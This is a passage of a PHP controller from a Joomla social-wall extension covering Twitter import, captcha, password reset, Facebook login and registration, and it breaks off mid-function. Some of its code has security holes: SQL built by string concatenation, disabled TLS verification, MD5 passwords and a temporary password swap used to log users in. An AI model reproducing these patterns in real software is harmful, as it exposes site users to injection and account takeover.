<?php
/**
 * @version 3.0
 * @package JomWALL CB
 * @author   AWDsolution.com
 * @link http://www.AWDsolution.com
 * @license GNU/GPL http://www.gnu.org/copyleft/gpl.html
 * @copyright Copyright (C) 2009 AWDsolution.com. All rights reserved.
*/
// no direct access
defined('_JEXEC') or die('Restricted access');
jimport('joomla.application.component.controller');
class awdwallController extends JControllerLegacy
{
	function __construct()
	{
		parent::__construct();
		// Register Extra tasks
		$this->registerTask('auto',	'searchAutoUser');
		$this->registerTask('addmp3', 'addMp3');
		$this->registerTask('addvideo', 'addVideo');
		$this->registerTask('addimage', 'addImage');
		$this->registerTask('viewvideo', 'viewVideo');
		$this->registerTask('viewimage', 'viewImage');
		$this->registerTask('addmsg', 'addMsg');
		$this->registerTask('getcbox', 'getCommentBox');
		$this->registerTask('addcomment', 'addComment');
		$this->registerTask('deletemsg', 'deleteMsg');	
		$this->registerTask('deletecomment', 'deleteComment');
		$this->registerTask('addlikemsg', 'addLikeMsg');
		$this->registerTask('getlikemsg', 'getLikeMsg');
		$this->registerTask('getpmbox', 'getPMBox');
		$this->registerTask('addpm', 'addPM');
		$this->registerTask('getlatestpost', 'getLatestPost');		
		$this->registerTask('videos', 'display');
		$this->registerTask('getoldermsg', 'getOlderPosts');
		$this->registerTask('getlikelink', 'getWhoLikesLink');
		$this->registerTask('getoldercomment', 'getOlderComments');
		$this->registerTask('music', 'display');
		$this->registerTask('addlink', 'addLink');
		$this->registerTask('ajaxstatuslink', 'ajaxstatuslink');
		$this->registerTask('addfile', 'addFile');
		$this->registerTask('addjing', 'addJing');
		$this->registerTask('getlastestmsg', 'getLatestMsg');
		$this->registerTask('addpmuser', 'addPMUser');		
		$this->registerTask('uploadavatar', 'uploadAvatar');
		$this->registerTask('addfriend', 'addFriend');
		$this->registerTask('friends', 'viewFriends');
		$this->registerTask('acceptfriend', 'acceptFriend');
		$this->registerTask('denyfriend', 'denyFriend');
		$this->registerTask('getolderfriend', 'getMoreFriends');
		$this->registerTask('deletefriend', 'deleteFriend');
		$this->registerTask('newgroup', 'newGroup');
		$this->registerTask('savegroup', 'saveGroup');
		$this->registerTask('viewgroup', 'viewGroup');
		$this->registerTask('joingroup', 'joinGroup');
		$this->registerTask('groupsetting', 'groupSetting');
		$this->registerTask('grpmembers', 'grpMembers');
		$this->registerTask('invitmMembers', 'inviteMembers');
		$this->registerTask('acceptinvite', 'acceptInvite');
		$this->registerTask('deletegrpmember', 'deleteGrpMember');
		$this->registerTask('showvideo', 'showvideo');
		$this->registerTask('addsoundcloud', 'addsoundcloud');
		$this->registerTask('getclikemsg', 'getcLikeMsg');
		$this->registerTask('deletelikemsg', 'deletelikemsg');
		$this->registerTask('getCommentlikeList','getCommentlikeList');
		$this->registerTask('login', 'loginpage');
	}
	function skypestatus()
	{	header("Pragma: no-cache"); 
       if(isset($_REQUEST['username']))
       {
			$user = $_REQUEST['username'];
			$curl = curl_init("http://mystatus.skype.com/".$user.".num");
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			$n = curl_exec($curl);
			//echo $n ;
			if ( !is_numeric($n) )
				$n = 0;
			$s = array(1 => 'offline', 2 => 'online', 3 => 'away', 5 => 'do_not_disturb');
			if ( array_key_exists($n, $s) )
				$status = $s[$n];
			else
				$status = 'offline';
			echo $status;
			curl_close($curl);
       }
	   exit;
	}
	function systwitterfeeds()
	{
		//ADD TWEETS TO WALL POST
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$itemId = AwdwallHelperUser::getComItemId();
		$jsItemId= AwdwallHelperUser::getJsItemId();
		$mainframe=JFactory::getApplication();
		$db		=& JFactory::getDBO();
		
		$day  = date('d');
		$month  = date('m');
		$year  = date('Y');
		$today=date("Y-m-d");
		
		$query 	= 'SELECT * FROM #__users WHERE block =0 AND id IN (SELECT userid FROM #__awd_jomalbum_userinfo )';
		$db->setQuery($query);
		$userlist=$db->loadObjectList();
		
		foreach($userlist as $user)
		{		$amount=0;
				$userinfo=AwdwallHelperUser::getUserInfo($user->id);
				if($userinfo->twitter_user!='' && $userinfo->display_twitter_post==1)
				{
					if($userinfo->latest_tweet_id)
						$feed = "http://search.twitter.com/search.atom?q=from%3A" . $userinfo->twitter_user."&since_id=".$userinfo->latest_tweet_id."&since=".$today;
					else
						$feed = "http://search.twitter.com/search.atom?q=from%3A" . $userinfo->twitter_user."&since=".$today;
						//echo $feed.'<br>';//exit;
					$now = time(); 
					if (function_exists('curl_init'))
					{		
						$ch =curl_init();
						curl_setopt($ch, CURLOPT_URL, $feed);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						$feed_details = curl_exec($ch);
						curl_close($ch);
					}
					else
					{
						$feed_details = file_get_contents($feed);
					}
					
					$feed = str_replace("&amp;", "&", $feed_details);
					$feed = str_replace("&lt;", "<", $feed);
					$feed = str_replace("&gt;", ">", $feed);
					$clean = explode("<entry>", $feed);
					$clean = str_replace("&quot;", "'", $clean);
					$clean = str_replace("&apos;", "'", $clean);
					$amount = count($clean) - 1;
					
					if ($amount) 
					{ // are there any tweets?
						for ($i = $amount; $i > 0; $i--) 
						{
							$entry_close = explode("</entry>", $clean[$i]); 
							$clean_content_1 = explode("<content type=\"html\">", $entry_close[0]);
							$clean_content = explode("</content>", $clean_content_1[1]);
							$clean_name_2 = explode("<name>", $entry_close[0]);
							$clean_name_1 = explode("(", $clean_name_2[1]);
							$clean_name = explode(")</name>", $clean_name_1[1]);
							$clean_user = explode(" (", $clean_name_2[1]);
							$clean_lower_user = strtolower($clean_user[0]);
							$clean_uri_1 = explode("<uri>", $entry_close[0]);
							$clean_uri = explode("</uri>", $clean_uri_1[1]);
							$clean_time_1 = explode("<published>", $entry_close[0]);
							$clean_time = explode("</published>", $clean_time_1[1]);
							$unix_time = strtotime($clean_time[0]);
							
							$clean_id_1 = explode("<id>", $entry_close[0]);
							$clean_id_2 = explode("</id>", $clean_id_1[1]);
							$clean_id = explode(":", $clean_id_2[0]);
							
							//store to wall table			
							$wall 				=& JTable::getInstance('Wall', 'Table');						
							$wall->user_id		= $user->id;
							$wall->group_id		= NULL;
							$wall->type			= 'text';
							$wall->commenter_id	= $user->id;
							$wall->user_name	= '';
							$wall->avatar		= '';
							$wall->message		= nl2br($clean_content[0]);
							$wall->reply		= 0;
							$wall->is_read		= 0;
							$wall->is_pm		= 0;
							$wall->is_reply		= 0;
							$wall->posted_id	= NULL;
							$wall->wall_date	= $unix_time;
							// store wall to database
				
							if (!$wall->store()){				
								$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
							}
				
							//insert into awd_wall_ privacy table.
							$query = 'INSERT INTO #__awd_wall_privacy(wall_id, privacy) VALUES(' . $wall->id . ', ' . $userinfo->twitter_privacy . ')';
							$db->setQuery($query);
							$db->query();
							
							//insert into wall_tweet table
							$query = 'INSERT INTO #__awd_wall_tweets(wall_id) VALUES(' . $wall->id . ')';
							$db->setQuery($query);
							$db->query();
							
							 if($i==$amount)
							 {
								$sql = 'UPDATE #__awd_jomalbum_userinfo SET latest_tweet_id="'.$clean_id[2].'" WHERE userid="'.$user->id.'"';
								$db->setQuery($sql);
								$db->query();
							}
							sleep(5);
						}
					} 		
				}
			echo 'Twitter feed Completed for '.$user->name.' ( '.$amount.' feeds )<br>';	
			sleep(5);	
		}


	}

	function ajaxcaptcha()
	{
		session_start();
		$word_1 = '';
		for ($i = 0; $i < 4; $i++) 
		{
			$word_1 .= chr(rand(97, 122));
		}
		for ($i = 0; $i < 4; $i++) 
		{
			$word_2 .= chr(rand(97, 122));
		}
		$_SESSION['awdcpnumber'] = $word_1.' '.$word_2;
		$dir = JPATH_SITE . '/components/com_awdwall/css/fonts/';
		$image = imagecreatetruecolor(165, 50);
		$font = "recaptchaFont.ttf"; // font style
		$color = imagecolorallocate($image, 0, 0, 0);// color
		$white = imagecolorallocate($image, 255, 255, 255); // background color white
		imagefilledrectangle($image, 0,0, 709, 99, $white);
		imagettftext ($image, 22, 0, 5, 30, $color, $dir.$font, $_SESSION['awdcpnumber']);
		header("Content-type: image/png");
		imagepng($image);
		exit;
	}
	function ajaxforgot()
	{
		error_reporting(0);
		require_once(JPATH_SITE . '/components/com_users/helpers/route.php');
		$lang = JFactory::getLanguage();
		$extension = 'com_users';
		$base_dir = JPATH_SITE;
		$language_tag = $lang->getTag();
		$reload = true;
		$lang->load($extension, $base_dir, $language_tag, $reload);
		$config = JFactory::getConfig();
		$db		= JFactory::getDbo();
		$params = JComponentHelper::getParams('com_users');
		
		$requestData ['email']= JRequest::getVar('email');
	
		// Find the user id for the given email address.
		$query	= $db->getQuery(true);
		$query->select('id');
		$query->from($db->quoteName('#__users'));
		$query->where($db->quoteName('email').' = '.$db->Quote($requestData ['email']));

		// Get the user object.
		$db->setQuery((string) $query);

		try
		{
			$userId = $db->loadResult();
		}
		catch (RuntimeException $e)
		{
			//$this->setError(JText::sprintf('COM_USERS_DATABASE_ERROR', $e->getMessage()), 500);
			awdwallController::ajaxResponse('$error$'.JText::sprintf('COM_USERS_DATABASE_ERROR', $e->getMessage()));
		}

		// Check for a user.
		if (empty($userId)) {
			awdwallController::ajaxResponse('$error$'.JText::_('COM_USERS_INVALID_EMAIL'));
		}

		// Get the user object.
		$user = JUser::getInstance($userId);

		// Make sure the user isn't blocked.
		if ($user->block) {
			awdwallController::ajaxResponse('$error$'.JText::_('COM_USERS_USER_BLOCKED'));
		}

		// Make sure the user isn't a Super Admin.
		if ($user->authorise('core.admin')) {
			awdwallController::ajaxResponse('$error$'.JText::_('COM_USERS_REMIND_SUPERADMIN_ERROR'));
		}

		// Make sure the user has not exceeded the reset limit
		$params = JFactory::getApplication()->getParams();
		$maxCount = (int) $params->get('reset_count');
		$resetHours = (int) $params->get('reset_time');
		$result = true;

		$lastResetTime = strtotime($user->lastResetTime) ? strtotime($user->lastResetTime) : 0;
		$hoursSinceLastReset = (strtotime(JFactory::getDate()->toSql()) - $lastResetTime) / 3600;

		// If it's been long enough, start a new reset count
		if ($hoursSinceLastReset > $resetHours)
		{
			$user->lastResetTime = JFactory::getDate()->toSql();
			$user->resetCount = 1;
		}

		// If we are under the max count, just increment the counter
		elseif ($user->resetCount < $maxCount)
		{
			$user->resetCount;
		}

		// At this point, we know we have exceeded the maximum resets for the time period
		else
		{
			$result = false;
		}
		
		
		if (!$result) {
			$resetLimit = (int) JFactory::getApplication()->getParams()->get('reset_time');
			//$this->setError(JText::plural('COM_USERS_REMIND_LIMIT_ERROR_N_HOURS', $resetLimit));
			awdwallController::ajaxResponse('$error$'.JText::plural('COM_USERS_REMIND_LIMIT_ERROR_N_HOURS', $resetLimit));
			//return false;
		}

		// Set the confirmation token.
		$token = JApplication::getHash(JUserHelper::genRandomPassword());
		$salt = JUserHelper::getSalt('crypt-md5');
		$hashedToken = md5($token.$salt).':'.$salt;

		$user->activation = $hashedToken;

		// Save the user to the database.
		if (!$user->save(true)) {
			awdwallController::ajaxResponse('$error$'.JText::sprintf('COM_USERS_USER_SAVE_FAILED', $user->getError()));
			//return new JException(JText::sprintf('COM_USERS_USER_SAVE_FAILED', $user->getError()), 500);
		}
		
		// Assemble the password reset confirmation link.
		$mode = $config->get('force_ssl', 0) == 2 ? 1 : -1;
		$itemid = UsersHelperRoute::getLoginRoute();
		$itemid = $itemid !== null ? '&Itemid='.$itemid : '';
		$link = 'index.php?option=com_users&view=reset&layout=confirm'.$itemid;
				

		// Put together the email template data.
		$data = $user->getProperties();
		$data['fromname']	= $config->get('fromname');
		$data['mailfrom']	= $config->get('mailfrom');
		$data['sitename']	= $config->get('sitename');
		$data['link_text']	= JRoute::_($link, false, $mode);
		$data['link_html']	= JRoute::_($link, true, $mode);
		$data['token']		= $token;

		$subject = JText::sprintf(
			'COM_USERS_EMAIL_PASSWORD_RESET_SUBJECT',
			$data['sitename']
		);

		$body = JText::sprintf(
			'COM_USERS_EMAIL_PASSWORD_RESET_BODY',
			$data['sitename'],
			$data['token'],
			$data['link_text']
		);

		// Send the password reset request email.
		$return = JFactory::getMailer()->sendMail($data['mailfrom'], $data['fromname'], $user->email, $subject, $body);
		// Check for an error.
		if ($return !== true) {
			awdwallController::ajaxResponse('$error$'.JText::_('COM_USERS_MAIL_FAILED'));
		}		
		awdwallController::ajaxResponse(JText::_('COM_COMAWDWALL_FORGOTPASS_SUCCESS_TEXT'));
		exit;
	}
	function upavatar($path){
		jimport('joomla.filesystem.file');
		jimport('joomla.filesystem.folder');
		
		if(!JFolder::exists($path)){
			JFolder::create($path);			
		}		
		return true;
	}
	
	function send_request($url,$postData = null,$opt_arr = null)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		if ($postData)
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
		}
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9");
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		if ($opt_arr)
		{
			foreach ($opt_arr as $k => $v)
			{
				curl_setopt($ch, $k,$v);
			}
		}
		$result = curl_exec ($ch);
		curl_close ($ch);
		return $result;
	}
	
	
	function facebooklogin()
	{
		$app = JFactory::getApplication('site');
		$db		=& JFactory::getDBO();
		$user = & JFactory::getUser();
		
		$config =  & $app->getParams('com_awdwall');
		$fb_id		 = $config->get('fb_id', '');
		$fb_key		 = $config->get('fb_key', '');
		$fb_secret	 = $config->get('fb_secret', '');
		$Itemid = AwdwallHelperUser::getComItemId();
		$awdreturnurl=JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=main&Itemid=' . $Itemid, false);
		
      if(isset($_COOKIE['fbsr_' . $fb_id])){
         list($encoded_sig, $payload) = explode('.', $_COOKIE['fbsr_' . $fb_id], 2);
  
         $sig = base64_decode(strtr($encoded_sig, '-_', '+/'));
         $data = json_decode(base64_decode(strtr($payload, '-_', '+/')), true);
   
         if (strtoupper($data['algorithm']) !== 'HMAC-SHA256') {
             return null;
         }
         $expected_sig = hash_hmac('sha256', $payload,
         $fb_secret, $raw = true);
          if ($sig !== $expected_sig) {
              return null;
          }
          $token_url = "https://graph.facebook.com/oauth/access_token?"
         . "client_id=" . $fb_id . "&client_secret=" . $fb_secret. "&redirect_uri=" . "&code=" . $data['code'];
			if (function_exists('curl_init'))
			{		
				$parsedUrl = parse_url($token_url);
				$ch = curl_init();
				$options = array(
				CURLOPT_URL => $token_url,
				CURLOPT_RETURNTRANSFER => 1,
				CURLOPT_HTTPHEADER => array("Host: " . $parsedUrl['host']),
				CURLOPT_SSL_VERIFYHOST => 0,
				CURLOPT_SSL_VERIFYPEER => false
				);
				curl_setopt_array($ch, $options);
				$response = @curl_exec($ch);
			}
			else
			{
				$response = file_get_contents($token_url);
			}
          //$response = @file_get_contents($token_url);
          $params = null;
          parse_str($response, $params);
          $data['access_token'] = $params['access_token'];
		  $cookie= $data;
		}
		else
		{	
			$cookie= null;
		}

if($cookie){
	if (function_exists('curl_init'))
	{		
		$newurl='https://graph.facebook.com/me?access_token=' . $cookie['access_token'];
		$parsedUrl = parse_url($newurl);
		$ch = curl_init();
		$options = array(
		CURLOPT_URL => $newurl,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_HTTPHEADER => array("Host: " . $parsedUrl['host']),
		CURLOPT_SSL_VERIFYHOST => 0,
		CURLOPT_SSL_VERIFYPEER => false
		);
		curl_setopt_array($ch, $options);
		$newresponse = @curl_exec($ch);
		$user_details = json_decode($newresponse);
	}
	else
	{
		$user_details = json_decode(file_get_contents('https://graph.facebook.com/me?access_token=' . $cookie['access_token']));
	}
	//$user_details = json_decode(file_get_contents('https://graph.facebook.com/me?access_token=' . $cookie['access_token']));
	if(count($user_details)){
	
	
		$db->setQuery("SELECT u.id, u.username, u.email FROM #__users AS u INNER JOIN #__jconnector_ids AS ji ON u.id=ji.user_id WHERE ji.facebook_id = ".$user_details->id);
		
		$user_data = $db->loadObject();
	
		if(!$user_data) //we don't have this FB user in our DB yet
		{		
			if ($user->id) //update existing user with his facebook_id
			{
				$username = $user->username;
				$user_id = $user->id;					
			}
			else //register a new user
			{
				//generate an unique username
				$i = 0;
				$username_base = str_replace(' ', '_', $user_details->name);
				$username = '';
				do
				{
					if (!$username) $username = $username_base;
					else $username = $username_base.$i;
					$db->setQuery("SELECT id FROM #__users WHERE username = '".$username."'");
					$data = $db->loadObject();
					$i++;
				}while($data);
				$generated_details['username'] = $username;
				$generated_details['password'] = substr(uniqid(true), 0, 20);
				$generated_details['email'] = $user_details->email;		
				
				$user_id = awdwallController::register_joomla($generated_details, $user_details);	
			}
			//create entry that associates user_id with facebook_id
			if ($user_id)
			{
					$sql="SELECT count(*) as cnt FROM #__jconnector_ids WHERE facebook_id='".$user_details->id."'";
					$db->setQuery($sql);
					$cnt = $db->loadResult();	
					if($cnt==0)
					{	
						$query = 'INSERT INTO #__jconnector_ids (user_id, facebook_id) VALUES("'.$user_id.'", "'.$user_details->id.'")';
						$db->setQuery($query);
						$db->query();
					}
					else
					{
						$query = "UPDATE #__jconnector_ids SET user_id='".$user_id."' where facebook_id='".$user_details->id."'";
						$db->setQuery($query);
						$db->query();
					}		
			}			
		}
		else
		{
			if ($user->id) //somebody is trying to connect second Joomla account with the same Facebook user
			{
				$username = $user_data->username;			
			}
			else //a connected user is trying to sign in
			{
				$username = $user_data->username;
			}
		}
		$sql="SELECT id FROM #__users, #__jconnector_ids WHERE user_id = id AND facebook_id=".$user_details->id;
		//echo $sql;
		$db->setQuery($sql);
		$rows = $db->loadObject();		
		$userid = $rows->id;
			//echo $userid;exit;
		if($userid){
		
					if (function_exists('curl_init'))
					{		
						$newurl='https://api.facebook.com/method/users.getInfo?uids='.$user_details->id.'&fields=pic&access_token='. $cookie['access_token'];
						$parsedUrl = parse_url($newurl);
						$ch = curl_init();
						$options = array(
						CURLOPT_URL => $newurl,
						CURLOPT_RETURNTRANSFER => 1,
						CURLOPT_HTTPHEADER => array("Host: " . $parsedUrl['host']),
						CURLOPT_SSL_VERIFYHOST => 0,
						CURLOPT_SSL_VERIFYPEER => false
						);
						curl_setopt_array($ch, $options);
						$str = @curl_exec($ch);
					}
					else
					{
						$str = file_get_contents('https://api.facebook.com/method/users.getInfo?uids='.$user_details->id.'&fields=pic&access_token='. $cookie['access_token']);
					}
					//get avatar
					//$str = file_get_contents('https://api.facebook.com/method/users.getInfo?uids='.$user_details->id.'&fields=pic&access_token='. $cookie['access_token']);
		
					$title_regex = "/<pic>(.+)<\/pic>/i";
					preg_match_all($title_regex, $str, $url, PREG_PATTERN_ORDER);
					$img = $url[1];
					$url = $img[0];	
					
					$temp = explode('/', $url);
					$fileName = $temp[(count($temp)-1)];					
					$src = awdwallController::send_request($url);
					
					awdwallController::upavatar(JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS);
					awdwallController::upavatar(JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS . 'original' . DS);
					awdwallController::upavatar(JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS . 'thumb' . DS);
					
					$path 	= JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS . $fileName;			
					file_put_contents($path, $src);
					
					$path_thub 	= JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS . 'thumb' . DS;		
					//thumb
					$file_thumb = str_replace('_s.', '_q.', $fileName);
					$url_thumb	= str_replace('_s.', '_q.', $url);
					$src_thumb	= awdwallController::send_request($url_thumb);	
					file_put_contents($path_thub.DS.$file_thumb, $src_thumb);		
					rename($path_thub.DS.$file_thumb, $path_thub.DS.'tn'.$fileName);
					
					file_put_contents($path_thub.DS.$fileName, $src);
					
					//original
					$path_ori 	= JPATH_BASE . DS . 'images' . DS . 'wallavatar' . DS . $userid . DS . 'original' . DS;		
					$file_thumb = str_replace('_s.', '_q.', $fileName);
					$url_thumb	= str_replace('_s.', '_q.', $url);
					$src_thumb	= awdwallController::send_request($url_thumb);	
					file_put_contents($path_ori.DS.$file_thumb, $src_thumb);		
					
					file_put_contents($path_ori.DS.$fileName, $src);
			
					$db->setQuery("SELECT user_id FROM #__awd_wall_users WHERE user_id = '$userid'");
					$rows = $db->loadObject();
					
					if($user_details->gender == 'male')
						$gender = 1;
					else
						$gender = 0;
						
					if(count($rows)){
						$query_wall = "UPDATE #__awd_wall_users SET avatar='$fileName', gender='$gender', birthday='".$user_details->birthday."' WHERE user_id= '$userid'";
						//echo $query_wall;
						$db->setQuery($query_wall);
						$db->query();
					}else{
						$query_wall = "INSERT INTO #__awd_wall_users (user_id, avatar, gender, birthday, aboutme) VALUES('$userid', '$fileName', '$gender', '".$user_details->birthday."', '')";
						//echo $query_wall;
						$db->setQuery($query_wall);
						$db->query();
					}
					
				}		
		
		if($userid){
			$app = &JFactory::getApplication();
				$query = "SELECT password FROM #__users WHERE id='".$userid."';";
				//echo $query.'<br>';
				$db->setQuery($query);
				$oldpass = $db->loadResult();
				//echo $oldpass.'<br>';
				jimport( 'joomla.user.helper' );
				$password = JUserHelper::genRandomPassword(5);
				$query = "UPDATE #__users SET password='".md5($password)."' WHERE id='".$userid."';";
				//echo $query.'<br>';
				$db->setQuery($query);
				$db->query();
				$app = JFactory::getApplication();
				$credentials = array(
					"username" => $username, 
					"password" => $password
				);
						
				$app->login($credentials);
				
				$query = "UPDATE #__users SET password='".$oldpass."' WHERE id='".$userid."';";
				$db->setQuery($query);
				$db->query();
		}
	}	
}
$this->setRedirect($awdreturnurl);
}
	
	
	function register_joomla($generated_details, $user_details)
	{
		$app = JFactory::getApplication('site');
		$db		=& JFactory::getDBO();
		$user = & JFactory::getUser();
		
		$dob=$_REQUEST['year'].'/'.$_REQUEST['month'].'/'.$_REQUEST['day'];		
		$user = array();
		$user['fullname'] = $generated_details['username'];
		$user['email'] = $user_details->email;
		$password =substr(uniqid(true), 0, 20);
		$user['password'] = md5($password);
		$user['username'] = $generated_details['username'];
		
		$instance = JUser::getInstance();
		
		jimport('joomla.application.component.helper');
		$config = JComponentHelper::getParams('com_users');
		// Default to Registered.
		$defaultUserGroup = $config->get('new_usertype', 2);
		
		$acl = JFactory::getACL();
		
		$instance->set('id'         , 0);
		$instance->set('name'           , $user['fullname']);
		$instance->set('username'       , $user['username']);
		$instance->set('password' , $user['password']);
		$instance->set('email'          , $user['email']);  // Result should contain an email (check)
		$instance->set('usertype'       , 'deprecated');
		$instance->set('groups'     , array($defaultUserGroup));
		
		//If autoregister is set let's register the user
		$autoregister = isset($options['autoregister']) ? $options['autoregister'] :  $config->get('autoregister', 1);
		
		if ($autoregister)
		{
			if (!$instance->save())
			{
			return JError::raiseWarning('SOME_ERROR_CODE', $instance->getError());
			}
		}
		else
		{
			// No existing user and autoregister off, this is a temporary user.
			$instance->set('tmp_user', true);
		}
		
		$lang = JFactory::getLanguage();
	    $lang->load('com_users');
		
        	$config = JFactory::getConfig();
                
            $fromname   = $config->get('fromname');
            $mailfrom   = $config->get('mailfrom');
            $sitename   = $config->get('sitename');
			$siterurl=str_replace('/modules/mod_jomwallogin/','',JURI::root());
			$siteurl    = $siterurl;
			
            $emailSubject   = JText::sprintf('ACCOUNT ACTIVATION SUBJECT',$user['fullname'],$sitename);
            $emailBody = JText::sprintf('ACCOUNT ACTIVATION BODY',$user['fullname'],$siteurl,$user['username'],$password);
            //$result = JUtility::sendMail($mailfrom, $fromname, $user_details->email, $emailSubject, $emailBody);
		
			$mailer = JFactory::getMailer();
			$mailer->setSender(array($mailfrom , $fromname));
			$mailer->setSubject($emailSubject);
			$mailer->setBody($emailBody);
			$mailer->IsHTML(1);
			$mailer->addRecipient($user_details->email);
			$rs = $mailer->Send();
		
		
		
		
		
	    //now we must activate this user
		$query = 'SELECT id FROM #__users WHERE username = '.$db->Quote($generated_details['username']);
		//echo $query;
		$db->setQuery($query);
		$user_id = intval($db->loadResult());
		//echo $user_id;
		
	    $query = 'UPDATE #__users SET email='.$db->Quote($user_details->email).' WHERE id='.$db->Quote($user_id);
		$db->setQuery($query);
		$db->query();
		return $user_id;
	}	
	
	
	
	function ajaxlogin()
	{
			$app = JFactory::getApplication();
			$options = array();
			$options['remember'] = JRequest::getBool('remember', false);
			$options['return'] = '';
			
			
			$credentials = array(
				"username" => JRequest::getVar('username'), 
				"password" => JRequest::getVar('passwd')
			);
			$error =$app->login($credentials, $options);
			echo $error;
		exit;
	}
	function loginpage()
	{
		$db		=& JFactory::getDBO();
		$view  = $this->getView('awdwall', 'html');
		$view->setLayout('loginpage');
		$view->loginpage();
		
	}
	function ajaxResponse($message){
		$obLevel = ob_get_level();
		if($obLevel){
			while ($obLevel > 0 ) {
				ob_end_clean();
				$obLevel --;
			}
		}else{
			ob_clean();
		}
		echo $message;
		exit;
	}

	function ajaxregister()
	{
		
		$lang = JFactory::getLanguage();
		$extension = 'com_users';
		$base_dir = JPATH_SITE;
		$language_tag = $lang->getTag();
		$reload = true;
		$lang->load($extension, $base_dir, $language_tag, $reload);
		$config = JFactory::getConfig();
		$db		= JFactory::getDbo();
		$params = JComponentHelper::getParams('com_users');
		$captchacode=strtolower(JRequest::getVar('captchacode'));
		$session_captchacode=$_SESSION['awdcpnumber'];
		if(strcmp($captchacode,$session_captchacode)!=0){
			// set message in here : Registration is disable
			awdwallController::ajaxResponse('$errorcaptcha$'.JText::_('COM_COMAWDWALL_CAPTCHA_ERROR_TEXT'));
		}
		$requestData ['name']= JRequest::getVar('name');
		$requestData ['username']= JRequest::getVar('username');
		$requestData ['password1']= JRequest::getVar('passwd1');
		$requestData ['password2']= JRequest::getVar('passwd2');
		$requestData ['email1']= JRequest::getVar('email1');
		$requestData ['email2']= JRequest::getVar('email2');
		
		if(JComponentHelper::getParams('com_users')->get('allowUserRegistration') == 0){
			// set message in here : Registration is disable
			awdwallController::ajaxResponse('$error$'.JText::_('COM_COMAWDWALL_REGISTRATION_NOTALLOWED_TEXT'));
		}
		
		// Initialise the table with JUser.
		$user = new JUser;
		
		// Merge in the registration data.
		foreach ($requestData as $k => $v) {
			$data[$k] = $v;
		}

		// Prepare the data for the user object.
		$data['email']		= $data['email1'];
		$data['password']	= $data['password1'];
		$useractivation = $params->get ( 'useractivation' );
		
		// Check if the user needs to activate their account.
		if (($useractivation == 1) || ($useractivation == 2)) {
			$data ['activation'] = JApplication::getHash ( JUserHelper::genRandomPassword () );
			$data ['block'] = 1;
		}
		$system	= $params->get('new_usertype', 2);
		$data['groups'] = array($system);
		
		// Bind the data.
		if (! $user->bind ( $data )) {
			awdwallController::ajaxResponse('$error$'.JText::sprintf ( 'COM_USERS_REGISTRATION_BIND_FAILED', $user->getError () ));
		}
		
		// Load the users plugin group.
		JPluginHelper::importPlugin('user');

		// Store the data.
		if (!$user->save()) {
			awdwallController::ajaxResponse('$error$'.JText::sprintf('COM_USERS_REGISTRATION_SAVE_FAILED', $user->getError()));
		}

		// Compile the notification mail values.
		$data = $user->getProperties();
		$data['fromname']	= $config->get('fromname');
		$data['mailfrom']	= $config->get('mailfrom');
		$data['sitename']	= $config->get('sitename');
		$data['siteurl']	= JURI::root();
		
		// Handle account activation/confirmation emails.
		if ($useractivation == 2)
		{
			// Set the link to confirm the user email.					
			$data['activate'] = $data['siteurl'].'index.php?option=com_users&task=registration.activate&token='.$data['activation'];
			
			$emailSubject	= JText::sprintf(
				'COM_USERS_EMAIL_ACCOUNT_DETAILS',
				$data['name'],
				$data['sitename']
			);

			$emailBody = JText::sprintf(
				'COM_USERS_EMAIL_REGISTERED_WITH_ACTIVATION_BODY',
				$data['name'],
				$data['sitename'],
				$data['siteurl'].'index.php?option=com_users&task=registration.activate&token='.$data['activation'],
				$data['siteurl'],
				$data['username'],
				$data['password_clear']
			);
			
		}
		elseif ($useractivation == 1)
		{
			// Set the link to activate the user account.						
			$data['activate'] = $data['siteurl'].'index.php?option=com_users&task=registration.activate&token='.$data['activation'];
		
			$emailSubject	= JText::sprintf(
				'COM_USERS_EMAIL_ACCOUNT_DETAILS',
				$data['name'],
				$data['sitename']
			);
			

			$emailBody = JText::sprintf(
				'COM_USERS_EMAIL_REGISTERED_WITH_ACTIVATION_BODY',
				$data['name'],
				$data['sitename'],
				$data['siteurl'].'index.php?option=com_users&task=registration.activate&token='.$data['activation'],
				$data['siteurl'],
				$data['username'],
				$data['password_clear']
			);

		} else {

			$emailSubject	= JText::sprintf(
				'COM_USERS_EMAIL_ACCOUNT_DETAILS',
				$data['name'],
				$data['sitename']
			);

			$emailBody = JText::sprintf(
				'COM_USERS_EMAIL_REGISTERED_BODY',
				$data['name'],
				$data['sitename'],
				$data['siteurl']
			);
		}

		// Send the registration email.
		$return = JFactory::getMailer()->sendMail($data['mailfrom'], $data['fromname'], $data['email'], $emailSubject, $emailBody);
		
		//Send Notification mail to administrators
		if (($params->get('useractivation') < 2) && ($params->get('mail_to_admin') == 1)) {
			$emailSubject = JText::sprintf(
				'COM_USERS_EMAIL_REGISTERED_BODY',
				$data['name'],
				$data['sitename']
			);

			$emailBodyAdmin = JText::sprintf(
				'COM_USERS_EMAIL_REGISTERED_NOTIFICATION_TO_ADMIN_BODY',
				$data['name'],
				$data['username'],
				$data['siteurl']
			);

			// get all admin users
			$query = 'SELECT name, email, sendEmail' .
					' FROM #__users' .
					' WHERE sendEmail=1';

			$db->setQuery( $query );
			$rows = $db->loadObjectList();

